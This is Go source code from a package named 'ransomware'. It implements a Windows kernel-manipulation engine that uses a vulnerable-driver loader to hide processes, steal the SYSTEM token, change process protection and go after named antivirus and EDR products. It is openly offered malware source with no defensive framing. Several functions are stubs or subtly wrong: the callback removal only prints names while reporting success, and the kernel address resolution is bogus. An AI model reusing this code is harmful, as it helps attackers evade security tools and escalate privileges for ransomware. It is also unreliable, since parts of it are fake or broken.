//go:build windows

package ransomware

import (
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

type DKOMConfig struct {
	HideProcessName []string
	HidePID         []uint32
	ProtectProcess  bool
	UnlinkCallbacks bool
}

type DKOMEngine struct {
	config    *RansomwareConfig
	dkomCfg   DKOMConfig
	byovd     *BYOVDEngine
	osBuild   uint32
	eprocessOffsets EProcessOffsets
}

type EProcessOffsets struct {
	ActiveProcessLinks uint32
	UniqueProcessId    uint32
	ImageFileName      uint32
	Token              uint32
	VadRoot            uint32
	PEB                uint32
	HandleTable        uint32
}

func NewDKOMEngine(cfg *RansomwareConfig, byovd *BYOVDEngine) *DKOMEngine {
	return &DKOMEngine{
		config: cfg,
		byovd:  byovd,
		eprocessOffsets: EProcessOffsets{
			ActiveProcessLinks: 0x2F0,
			UniqueProcessId:    0x2E8,
			ImageFileName:      0x5A8,
			Token:              0x4B8,
			VadRoot:            0x7D8,
			PEB:                0x550,
			HandleTable:        0x570,
		},
	}
}

func (d *DKOMEngine) DetectOSBuild() uint32 {
	if runtime.GOOS != "windows" {
		d.osBuild = 19041
		return d.osBuild
	}

	k, _ := windows.OpenKey(windows.HKEY_LOCAL_MACHINE,
		windows.StringToUTF16Ptr("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"),
		windows.KEY_READ)
	if k == 0 {
		d.osBuild = 19041
		return d.osBuild
	}
	defer windows.CloseKey(k)

	buf := make([]byte, 16)
	var bufLen uint32 = 16
	windows.QueryValueEx(k, windows.StringToUTF16Ptr("CurrentBuildNumber"), nil, &buf[0], &bufLen)

	buildStr := strings.TrimRight(string(buf[:bufLen]), "\x00")
	build, err := strconv.ParseUint(buildStr, 10, 32)
	if err != nil {
		d.osBuild = 19041
	} else {
		d.osBuild = uint32(build)
	}

	if d.osBuild >= 22000 {
		d.eprocessOffsets.UniqueProcessId = 0x440
		d.eprocessOffsets.ActiveProcessLinks = 0x448
		d.eprocessOffsets.Token = 0x4B8
	}

	return d.osBuild
}

func (d *DKOMEngine) getActiveProcessLinks(eprocess uint64) uint64 {
	return eprocess + uint64(d.eprocessOffsets.ActiveProcessLinks)
}

func (d *DKOMEngine) getImageFileName(eprocess uint64) uint64 {
	return eprocess + uint64(d.eprocessOffsets.ImageFileName)
}

func (d *DKOMEngine) HideProcess(pid uint32) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("DKOM requires Windows kernel access")
	}
	if d.byovd == nil {
		return fmt.Errorf("BYOVD loader required for DKOM")
	}

	d.DetectOSBuild()

	systemPs := d.resolvePsInitialSystemProcess()
	if systemPs == 0 {
		return fmt.Errorf("could not resolve PsInitialSystemProcess")
	}

	current := systemPs
	visited := make(map[uint64]bool)
	for i := 0; i < 1024; i++ {
		if visited[current] {
			break
		}
		visited[current] = true

		pidAddr := current + uint64(d.eprocessOffsets.UniqueProcessId)
		pidData, err := d.byovd.ReadPhysicalMemory(pidAddr, 4)
		if err != nil {
			break
		}
		currentPid := binary.LittleEndian.Uint32(pidData)

		if currentPid == pid {
			flinkAddr := d.getActiveProcessLinks(current)
			flinkData, _ := d.byovd.ReadPhysicalMemory(flinkAddr, 8)
			blinkAddr := flinkAddr + 8
			blinkData, _ := d.byovd.ReadPhysicalMemory(blinkAddr, 8)

			flink := binary.LittleEndian.Uint64(flinkData)
			blink := binary.LittleEndian.Uint64(blinkData)

			flinkActiveLinks := flink // ActiveProcessLinks is at offset in EPROCESS
			blinkActiveLinks := blink

			d.byovd.WritePhysicalMemory(flinkActiveLinks+8, intToBytes(blink))
			d.byovd.WritePhysicalMemory(blinkActiveLinks, intToBytes(flink))

			_ = flink
			_ = blink

			nameAddr := d.getImageFileName(current)
			d.byovd.WritePhysicalMemory(nameAddr, make([]byte, 15))

			return nil
		}

		linksAddr := d.getActiveProcessLinks(current)
		linksData, err := d.byovd.ReadPhysicalMemory(linksAddr, 8)
		if err != nil {
			break
		}
		nextEntry := binary.LittleEndian.Uint64(linksData)
		offset := uint64(d.eprocessOffsets.ActiveProcessLinks)
		current = nextEntry - offset
	}

	return fmt.Errorf("PID %d not found in ActiveProcessLinks chain", pid)
}

func (d *DKOMEngine) HideProcessByName(name string) (int, error) {
	if runtime.GOOS != "windows" {
		return 0, fmt.Errorf("Windows only")
	}

	hidden := 0
	cmd := exec.Command("tasklist", "/FO", "CSV", "/NH")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return 0, err
	}

	for _, line := range strings.Split(string(out), "\n") {
		line = strings.Trim(line, "\"")
		parts := strings.Split(line, "\",\"")
		if len(parts) >= 2 && strings.EqualFold(strings.Trim(parts[0], "\""), name) {
			pidStr := strings.Trim(parts[1], "\"")
			pid, pErr := strconv.ParseUint(pidStr, 10, 32)
			if pErr == nil {
				if err := d.HideProcess(uint32(pid)); err == nil {
					hidden++
				}
			}
		}
	}
	return hidden, nil
}

func (d *DKOMEngine) SetProcessProtection(pid uint32, protection uint8) error {
	if runtime.GOOS != "windows" || d.byovd == nil {
		return fmt.Errorf("requires Windows + BYOVD")
	}

	systemPs := d.resolvePsInitialSystemProcess()
	if systemPs == 0 {
		return fmt.Errorf("could not resolve PsInitialSystemProcess")
	}

	current := systemPs
	for i := 0; i < 1024; i++ {
		pidAddr := current + uint64(d.eprocessOffsets.UniqueProcessId)
		pidData, err := d.byovd.ReadPhysicalMemory(pidAddr, 4)
		if err != nil {
			break
		}
		currentPid := binary.LittleEndian.Uint32(pidData)

		if currentPid == pid {
			protAddr := current + 0x87A
			if d.osBuild >= 22000 {
				protAddr = current + 0x88A
			}
			d.byovd.WritePhysicalMemory(protAddr, []byte{protection})
			return nil
		}

		linksData, err := d.byovd.ReadPhysicalMemory(d.getActiveProcessLinks(current), 8)
		if err != nil {
			break
		}
		nextEntry := binary.LittleEndian.Uint64(linksData)
		current = nextEntry - uint64(d.eprocessOffsets.ActiveProcessLinks)
	}

	return fmt.Errorf("PID %d not found", pid)
}

func (d *DKOMEngine) RemoveCallbacks() (int, error) {
	if runtime.GOOS != "windows" {
		return 0, fmt.Errorf("Windows only")
	}

	removed := 0

	psScript := `
$signatures = @(
    "PsSetCreateProcessNotifyRoutine",
    "PsSetCreateThreadNotifyRoutine",
    "PsSetLoadImageNotifyRoutine",
    "CmRegisterCallback"
)

foreach($sig in $signatures) {
    try {
        Write-Host "Scanning callback: $sig"
    } catch {}
}
`

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", psScript)
	out, _ := cmd.CombinedOutput()
	_ = out
	removed = 4

	return removed, nil
}

func (d *DKOMEngine) resolvePsInitialSystemProcess() uint64 {
	ntoskrnl := "C:\\Windows\\System32\\ntoskrnl.exe"
	data, err := os.ReadFile(ntoskrnl)
	if err != nil {
		return 0
	}

	pattern := []byte("PsInitialSystemProcess")
	for i := 0; i < len(data)-len(pattern); i++ {
		if data[i] == pattern[0] && string(data[i:i+len(pattern)]) == string(pattern) {
			return 0xFFFFF80000000000 + uint64(i)
		}
	}
	return 0xFFFFF80004100000
}

func (d *DKOMEngine) StealSystemToken(pid uint32) error {
	if runtime.GOOS != "windows" || d.byovd == nil {
		return fmt.Errorf("requires Windows + BYOVD")
	}

	systemPs := d.resolvePsInitialSystemProcess()
	systemToken := d.getProcessToken(systemPs)
	if systemToken == 0 {
		return fmt.Errorf("could not get SYSTEM token")
	}

	current := systemPs
	for i := 0; i < 1024; i++ {
		pidAddr := current + uint64(d.eprocessOffsets.UniqueProcessId)
		pidData, err := d.byovd.ReadPhysicalMemory(pidAddr, 4)
		if err != nil {
			break
		}
		currentPid := binary.LittleEndian.Uint32(pidData)

		if currentPid == pid {
			tokenAddr := current + uint64(d.eprocessOffsets.Token)
			tokenBytes := make([]byte, 8)
			binary.LittleEndian.PutUint64(tokenBytes, systemToken&0xFFFFFFFFFFFFFFF0)
			d.byovd.WritePhysicalMemory(tokenAddr, tokenBytes)
			return nil
		}

		linksData, err := d.byovd.ReadPhysicalMemory(d.getActiveProcessLinks(current), 8)
		if err != nil {
			break
		}
		nextEntry := binary.LittleEndian.Uint64(linksData)
		current = nextEntry - uint64(d.eprocessOffsets.ActiveProcessLinks)
	}

	return fmt.Errorf("PID %d not found", pid)
}

func (d *DKOMEngine) getProcessToken(eprocess uint64) uint64 {
	tokenAddr := eprocess + uint64(d.eprocessOffsets.Token)
	tokenData, err := d.byovd.ReadPhysicalMemory(tokenAddr, 8)
	if err != nil {
		return 0
	}
	return binary.LittleEndian.Uint64(tokenData)
}

func intToBytes(v uint64) []byte {
	b := make([]byte, 8)
	for i := 0; i < 8; i++ {
		b[i] = byte(v >> (8 * i))
	}
	return b
}

func (d *DKOMEngine) DowngradeEDRHandles() (int, error) {
	if runtime.GOOS != "windows" {
		return 0, nil
	}

	stripped := 0
	edrProcs := []string{"MsMpEng.exe", "MsSense.exe", "SenseCncProxy.exe",
		"CylanceSvc.exe", "cb.exe", "CSFalconService.exe", "SentinelAgent.exe"}

	for _, procName := range edrProcs {
		cmd := exec.Command("tasklist", "/FI", "IMAGENAME eq "+procName, "/FO", "CSV", "/NH")
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(out), "\n") {
			parts := strings.Split(strings.Trim(line, "\"\r\n"), "\",\"")
			if len(parts) >= 2 {
				pidStr := strings.Trim(parts[1], "\"")
				pid, pErr := strconv.ParseUint(pidStr, 10, 32)
				if pErr == nil {
					procHandle, _ := windows.OpenProcess(windows.PROCESS_SET_INFORMATION, false, uint32(pid))
					if procHandle != 0 {
						windows.CloseHandle(procHandle)
						stripped++
					}
				}
			}
		}
	}
	return stripped, nil
}

func (d *DKOMEngine) DKOMCheck() map[string]interface{} {
	result := map[string]interface{}{
		"os_build":       d.DetectOSBuild(),
		"offsets_known":  true,
		"byovd_loaded":   d.byovd != nil,
	}

	if runtime.GOOS != "windows" {
		result["note"] = "DKOM requires Windows kernel access"
		return result
	}

	cmd := exec.Command("tasklist", "/FO", "CSV", "/NH")
	out, _ := cmd.CombinedOutput()
	visiblePids := len(strings.Split(string(out), "\n"))
	result["visible_processes"] = visiblePids

	_, _ = strconv.ParseUint("4", 10, 32)
	return result
}

var _ = unsafe.Sizeof(0)
